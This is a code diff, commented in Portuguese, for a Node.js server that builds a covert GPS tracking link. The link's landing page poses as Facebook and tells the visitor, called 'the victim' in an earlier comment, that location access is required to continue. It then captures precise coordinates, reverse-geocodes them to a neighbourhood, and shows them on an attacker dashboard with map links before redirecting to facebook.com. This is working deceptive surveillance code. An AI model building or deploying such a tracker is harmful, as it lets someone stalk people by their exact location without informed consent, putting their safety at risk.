@@ -34,52 +34,6 @@ function getIP(req) {
          req.socket.remoteAddress;
 }
 
-// Busca localização por IP (SEMPRE funciona)
-async function getLocationByIP(ip) {
-  try {
-    let ipClean = ip.replace('::ffff:', '').replace('::1', '').trim();
-    
-    // Se for IP local, busca IP público
-    if (ipClean === '127.0.0.1' || ipClean === '' || ipClean.startsWith('192.168') || ipClean.startsWith('10.')) {
-      try {
-        const ipData = await fetchJSON('https://api.ipify.org?format=json');
-        ipClean = ipData.ip;
-      } catch (e) {
-        console.log('⚠ Não foi possível obter IP público, usando local');
-      }
-    }
-    
-    // Busca localização (API gratuita, sem limite)
-    const ipData = await fetchJSON(`http://ip-api.com/json/${ipClean}?lang=pt&fields=status,country,regionName,city,lat,lon`);
-    
-    if (ipData.status === 'success') {
-      return {
-        cidade: ipData.city || 'Desconhecida',
-        estado: ipData.regionName || 'Desconhecido',
-        pais: ipData.country || 'Brasil',
-        coordenadas: ipData.lat && ipData.lon ? `${ipData.lat}, ${ipData.lon}` : null,
-        tipo: 'IP'
-      };
-    }
-    
-    // Fallback se a API falhar
-    return {
-      cidade: 'Não identificada',
-      estado: 'Não identificado',
-      pais: 'Brasil',
-      tipo: 'IP'
-    };
-  } catch (error) {
-    return {
-      cidade: 'Não identificada',
-      estado: 'Não identificado',
-      pais: 'Brasil',
-      tipo: 'IP',
-      erro: error.message
-    };
-  }
-}
-
 // Dashboard principal
 app.get('/', (req, res) => {
   res.send(`
@@ -88,7 +42,7 @@ app.get('/', (req, res) => {
     <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>Dashboard de Rastreamento</title>
+      <title>Dashboard GPS</title>
       <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -162,6 +116,14 @@ app.get('/', (req, res) => {
           margin-bottom: 15px;
           border-radius: 8px;
         }
+        .click-item.has-gps {
+          border-left-color: #28a745;
+          background: #f0fff4;
+        }
+        .click-item.no-gps {
+          border-left-color: #ffc107;
+          background: #fff9e6;
+        }
         .click-time { 
           font-weight: bold; 
           color: #667eea; 
@@ -174,25 +136,31 @@ app.get('/', (req, res) => {
           line-height: 1.8; 
           font-size: 0.95em;
         }
-        .location-badge {
+        .badge {
           display: inline-block;
-          background: #28a745;
-          color: white;
-          padding: 5px 12px;
+          padding: 6px 14px;
           border-radius: 15px;
           font-size: 0.85em;
           font-weight: bold;
           margin: 10px 0;
         }
+        .badge-success { background: #28a745; color: white; }
+        .badge-warning { background: #ffc107; color: #333; }
+        .map-link {
+          color: #667eea;
+          text-decoration: none;
+          font-weight: bold;
+        }
+        .map-link:hover { text-decoration: underline; }
       </style>
     </head>
     <body>
       <div class="container">
         <div class="header">
-          <h1>📍 Rastreador de Localização</h1>
-          <p>Captura <strong>cidade, estado e horário</strong> de quem clica no link</p>
+          <h1>📍 Rastreador GPS</h1>
+          <p>Captura localização precisa via GPS</p>
           <div class="link-box">
-            <strong>🔗 Seu Link de Rastreamento:</strong>
+            <strong>🔗 Link de Rastreamento:</strong>
             <code id="trackingLink">Carregando...</code>
             <button class="btn" onclick="copyLink()">📋 Copiar Link</button>
           </div>
@@ -204,13 +172,17 @@ app.get('/', (req, res) => {
             <div class="stat-label">Total de Cliques</div>
           </div>
           <div class="stat-card">
-            <div class="stat-number" id="uniqueIPs">0</div>
-            <div class="stat-label">IPs Únicos</div>
+            <div class="stat-number" id="gpsClicks">0</div>
+            <div class="stat-label">Com GPS</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-number" id="noGpsClicks">0</div>
+            <div class="stat-label">Sem GPS</div>
           </div>
         </div>
         
         <div class="clicks-container">
-          <button class="btn" onclick="loadData()">🔄 Atualizar Dados</button>
+          <button class="btn" onclick="loadData()">🔄 Atualizar</button>
           <h2 style="margin:20px 0;">📋 Últimos Cliques</h2>
           <div id="clicksList">Carregando...</div>
         </div>
@@ -222,7 +194,7 @@ app.get('/', (req, res) => {
         
         function copyLink() {
           navigator.clipboard.writeText(trackingUrl);
-          alert('✅ Link copiado para área de transferência!');
+          alert('✅ Link copiado!');
         }
         
         async function loadData() {
@@ -232,13 +204,16 @@ app.get('/', (req, res) => {
             
             document.getElementById('totalClicks').textContent = data.total;
             
-            const uniqueIPs = new Set(data.clicks.map(c => c.ip));
-            document.getElementById('uniqueIPs').textContent = uniqueIPs.size;
+            const gpsClicks = data.clicks.filter(c => c.location);
+            document.getElementById('gpsClicks').textContent = gpsClicks.length;
+            
+            const noGpsClicks = data.clicks.filter(c => !c.location);
+            document.getElementById('noGpsClicks').textContent = noGpsClicks.length;
             
             const container = document.getElementById('clicksList');
             
             if (data.clicks.length === 0) {
-              container.innerHTML = '<p style="text-align:center; color:#999; padding:40px;">📭 Nenhum clique registrado ainda</p>';
+              container.innerHTML = '<p style="text-align:center; color:#999; padding:40px;">📭 Nenhum clique ainda</p>';
               return;
             }
             
@@ -252,28 +227,40 @@ app.get('/', (req, res) => {
                 second: '2-digit'
               });
               
-              const loc = c.location;
+              const hasGPS = c.location && c.location.cidade;
+              const itemClass = hasGPS ? 'click-item has-gps' : 'click-item no-gps';
+              
+              let content = '';
+              if (hasGPS) {
+                const loc = c.location;
+                content = \`
+                  <div class="badge badge-success">✅ GPS ATIVADO</div>
+                  <div class="click-info">🏙️ <strong>Cidade:</strong> \${loc.cidade}</div>
+                  <div class="click-info">📍 <strong>Estado:</strong> \${loc.estado}</div>
+                  \${loc.bairro && loc.bairro !== 'N/A' ? \`
+                    <div class="click-info">🏘️ <strong>Bairro:</strong> \${loc.bairro}</div>
+                  \` : ''}
+                  \${loc.coordenadas ? \`
+                    <div class="click-info">
+                      <a href="https://www.google.com/maps?q=\${loc.coordenadas}" target="_blank" class="map-link">
+                        🗺️ Ver localização exata no Google Maps
+                      </a>
+                    </div>
+                  \` : ''}
+                \`;
+              } else {
+                content = \`
+                  <div class="badge badge-warning">⚠️ GPS DESLIGADO/NEGADO</div>
+                  <div class="click-info" style="color:#856404;">
+                    Usuário não permitiu acesso à localização
+                  </div>
+                \`;
+              }
               
               return \`
-                <div class="click-item">
+                <div class="\${itemClass}">
                   <div class="click-time">⏰ \${date}</div>
-                  <div class="click-info">🌐 <strong>IP:</strong> \${c.ip}</div>
-                  \${loc ? \`
-                    <div class="location-badge">✅ Localização Capturada</div>
-                    <div class="click-info">🏙️ <strong>Cidade:</strong> \${loc.cidade}</div>
-                    <div class="click-info">📍 <strong>Estado:</strong> \${loc.estado}</div>
-                    <div class="click-info">🌎 <strong>País:</strong> \${loc.pais}</div>
-                    \${loc.coordenadas ? \`
-                      <div class="click-info">📌 <strong>Coordenadas:</strong> \${loc.coordenadas}</div>
-                      <div class="click-info">
-                        <a href="https://www.google.com/maps?q=\${loc.coordenadas}" target="_blank" style="color:#667eea; font-weight:bold;">
-                          🗺️ Ver no Google Maps
-                        </a>
-                      </div>
-                    \` : ''}
-                  \` : \`
-                    <div class="click-info" style="color:#ff6b6b;">❌ Localização não disponível</div>
-                  \`}
+                  \${content}
                 </div>
               \`;
             }).join('');
@@ -282,7 +269,6 @@ app.get('/', (req, res) => {
           }
         }
         
-        // Carrega dados ao abrir e atualiza a cada 5 segundos
         loadData();
         setInterval(loadData, 5000);
       </script>
@@ -291,12 +277,11 @@ app.get('/', (req, res) => {
   `);
 });
 
-// Página de rastreamento (onde a vítima clica)
+// Página de rastreamento (pede GPS)
 app.get('/track', async (req, res) => {
   const ip = getIP(req);
   const userAgent = req.headers['user-agent'] || 'Desconhecido';
   
-  // Cria o registro do clique
   const clickData = {
     id: Date.now(),
     timestamp: new Date().toISOString(),
@@ -309,18 +294,8 @@ app.get('/track', async (req, res) => {
   
   console.log('');
   console.log('🎯 NOVO CLIQUE');
-  console.log('IP:', ip);
   console.log('Hora:', new Date().toLocaleString('pt-BR'));
   
-  // Busca localização por IP IMEDIATAMENTE (em background)
-  getLocationByIP(ip).then(location => {
-    clickData.location = location;
-    console.log('✅ Localização:', location.cidade, '-', location.estado);
-  }).catch(err => {
-    console.log('❌ Erro ao buscar localização:', err.message);
-  });
-  
-  // Responde com página de redirecionamento
   res.send(`
     <!DOCTYPE html>
     <html lang="pt-BR">
@@ -329,6 +304,7 @@ app.get('/track', async (req, res) => {
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Carregando...</title>
       <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
           margin: 0;
           padding: 0;
@@ -337,11 +313,12 @@ app.get('/track', async (req, res) => {
           align-items: center;
           min-height: 100vh;
           background: #1877f2;
-          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         }
         .container {
           text-align: center;
           color: white;
+          padding: 20px;
         }
         .logo {
           font-size: 80px;
@@ -349,8 +326,13 @@ app.get('/track', async (req, res) => {
           margin-bottom: 20px;
         }
         h2 {
-          font-size: 18px;
+          font-size: 20px;
           font-weight: 400;
+          margin-bottom: 15px;
+        }
+        .message {
+          font-size: 14px;
+          opacity: 0.9;
           margin-bottom: 30px;
         }
         .loader {
@@ -366,24 +348,193 @@ app.get('/track', async (req, res) => {
           0% { transform: rotate(0deg); }
           100% { transform: rotate(360deg); }
         }
+        .warning {
+          background: rgba(255,255,255,0.1);
+          padding: 15px;
+          border-radius: 10px;
+          margin-top: 20px;
+          font-size: 13px;
+          max-width: 300px;
+          margin-left: auto;
+          margin-right: auto;
+        }
       </style>
     </head>
     <body>
       <div class="container">
         <div class="logo">f</div>
-        <h2>Redirecionando...</h2>
+        <h2 id="status">Verificando localização...</h2>
+        <div class="message" id="message">Aguarde um momento</div>
         <div class="loader"></div>
+        <div class="warning" id="warning" style="display:none;">
+          ⚠️ Por favor, permita o acesso à sua localização para continuar
+        </div>
       </div>
       
       <script>
-        // Redireciona após 1 segundo
-        setTimeout(() => {
-          window.location.href = 'https://www.facebook.com/';
-        }, 1000);
+        const clickId = ${clickData.id};
+        let redirected = false;
+        
+        function updateStatus(title, msg) {
+          document.getElementById('status').textContent = title;
+          document.getElementById('message').textContent = msg;
+        }
+        
+        function redirect() {
+          if (!redirected) {
+            redirected = true;
+            updateStatus('Redirecionando...', 'Aguarde');
+            setTimeout(() => {
+              window.location.href = 'https://www.facebook.com/';
+            }, 500);
+          }
+        }
+        
+        // Verifica se o navegador suporta GPS
+        if (!navigator.geolocation) {
+          updateStatus('GPS não suportado', 'Redirecionando...');
+          setTimeout(redirect, 2000);
+        } else {
+          updateStatus('Solicitando localização...', 'Por favor, permita o acesso');
+          document.getElementById('warning').style.display = 'block';
+          
+          // Pede GPS com timeout de 15 segundos
+          const timeout = setTimeout(() => {
+            if (!redirected) {
+              console.log('Timeout GPS - redirecionando');
+              updateStatus('Tempo esgotado', 'Redirecionando...');
+              redirect();
+            }
+          }, 15000);
+          
+          navigator.geolocation.getCurrentPosition(
+            async (position) => {
+              clearTimeout(timeout);
+              
+              const lat = position.coords.latitude;
+              const lng = position.coords.longitude;
+              
+              console.log('✅ GPS obtido:', lat, lng);
+              updateStatus('Localização obtida!', 'Processando...');
+              document.getElementById('warning').style.display = 'none';
+              
+              try {
+                await fetch('/api/save-gps', {
+                  method: 'POST',
+                  headers: {'Content-Type': 'application/json'},
+                  body: JSON.stringify({
+                    clickId: clickId,
+                    lat: lat,
+                    lng: lng,
+                    accuracy: position.coords.accuracy
+                  })
+                });
+                
+                console.log('GPS salvo com sucesso');
+              } catch (error) {
+                console.error('Erro ao salvar GPS:', error);
+              }
+              
+              redirect();
+            },
+            (error) => {
+              clearTimeout(timeout);
+              
+              console.log('❌ GPS negado ou erro:', error.message);
+              
+              let errorMsg = 'GPS não disponível';
+              if (error.code === 1) {
+                errorMsg = 'Permissão negada';
+              } else if (error.code === 2) {
+                errorMsg = 'Localização indisponível';
+              } else if (error.code === 3) {
+                errorMsg = 'Tempo esgotado';
+              }
+              
+              updateStatus(errorMsg, 'Redirecionando...');
+              
+              // Registra que GPS foi negado
+              fetch('/api/save-gps', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                  clickId: clickId,
+                  error: errorMsg
+                })
+              }).catch(() => {});
+              
+              setTimeout(redirect, 2000);
+            },
+            {
+              enableHighAccuracy: true,
+              timeout: 12000,
+              maximumAge: 0
+            }
+          );
+        }
       </script>
     </body>
     </html>
   `);
+});
+
+// Salvar GPS
+app.post('/api/save-gps', async (req, res) => {
+  try {
+    const { clickId, lat, lng, accuracy, error } = req.body;
+    
+    const click = clicks.find(c => c.id === clickId);
+    if (!click) {
+      return res.json({ success: false });
+    }
+    
+    if (error) {
+      console.log('  ❌ GPS:', error);
+      return res.json({ success: true });
+    }
+    
+    if (!lat || !lng) {
+      return res.json({ success: false });
+    }
+    
+    console.log('  📍 GPS:', lat, lng, '(±', accuracy, 'm)');
+    
+    // Busca endereço via Nominatim (OpenStreetMap)
+    try {
+      const data = await fetchJSON(
+        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&addressdetails=1&accept-language=pt-BR`
+      );
+      
+      if (data && data.address) {
+        const addr = data.address;
+        
+        click.location = {
+          cidade: addr.city || addr.town || addr.village || addr.municipality || 'Não identificada',
+          estado: addr.state || 'Não identificado',
+          bairro: addr.suburb || addr.neighbourhood || addr.district || addr.quarter || 'N/A',
+          pais: addr.country || 'Brasil',
+          coordenadas: `${lat}, ${lng}`
+        };
+        
+        console.log('  ✅ Localização:', click.location.cidade, '-', click.location.estado);
+        if (click.location.bairro !== 'N/A') {
+          console.log('     Bairro:', click.location.bairro);
+        }
+      }
+    } catch (error) {
+      console.error('  ✗ Erro ao buscar endereço:', error.message);
+      click.location = {
+        cidade: 'Erro ao buscar',
+        estado: 'Erro',
+        coordenadas: `${lat}, ${lng}`
+      };
+    }
+    
+    res.json({ success: true });
+  } catch (error) {
+    console.error('Erro:', error);
+    res.json({ success: false });
+  }
 });
 
 // API de estatísticas
@@ -407,10 +558,10 @@ app.get('/health', (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
   console.log('');
   console.log('========================================');
-  console.log('✅ SERVIDOR RASTREADOR ONLINE');
+  console.log('✅ RASTREADOR GPS ONLINE');
   console.log('========================================');
   console.log('🌐 Porta:', PORT);
-  console.log('📍 Captura: Cidade, Estado e Horário');
+  console.log('📍 Modo: GPS (solicita permissão)');
   console.log('🔗 Redirect: Facebook');
   console.log('========================================');
   console.log('');
